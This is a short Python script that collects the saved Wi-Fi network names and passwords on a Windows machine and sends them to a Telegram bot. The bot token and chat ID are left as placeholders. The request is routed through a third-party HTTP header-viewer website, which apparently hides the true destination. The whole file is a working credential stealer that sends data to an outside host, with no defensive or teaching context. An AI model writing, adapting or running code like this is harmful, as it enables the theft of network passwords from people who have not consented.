import requests
import wifiPassword
import subprocess

def wifi():
    command = "netsh wlan show profile"
    com_out = (
        subprocess.getoutput(command)
        .replace("Profiles on interface Wireless Network Connection:", "")
        .replace("Group policy profiles (read only)", "")
        .replace("---------------------------------", "")
        .replace("    <None>", "")
        .replace("User profiles", "")
        .replace("-------------", "")
        .replace(":", "")
        .replace("    All User Profile     ", "")
        .strip()
        .split("\n")
    )

    pass_list = []

    for x in com_out:
        p = subprocess.getoutput(f"wifipassword {x}")
        pass_list.append(p)

    return pass_list

def send_me(mess):

    data = {
        'UrlBox': f'https://api.telegram.org/bot<BOT_TOKEN>/sendMessage?chat_id=<USER_CHAT_ID>&text={mess}',
        'ContentTypeBox': '',
        'ContentDataBox': '',
        'HeadersBox': '',
        'RefererBox': '',
        'AgentList': 'Internet Explorer',
        'AgentBox': '',
        'VersionsList': 'HTTP/1.1',
        'MethodList': 'POST',
    }

    response = requests.post('https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx', data=data)
    return response.text

if __name__ == "__main__":
    wifi_data = wifi()
    send_me(mess=wifi_data)
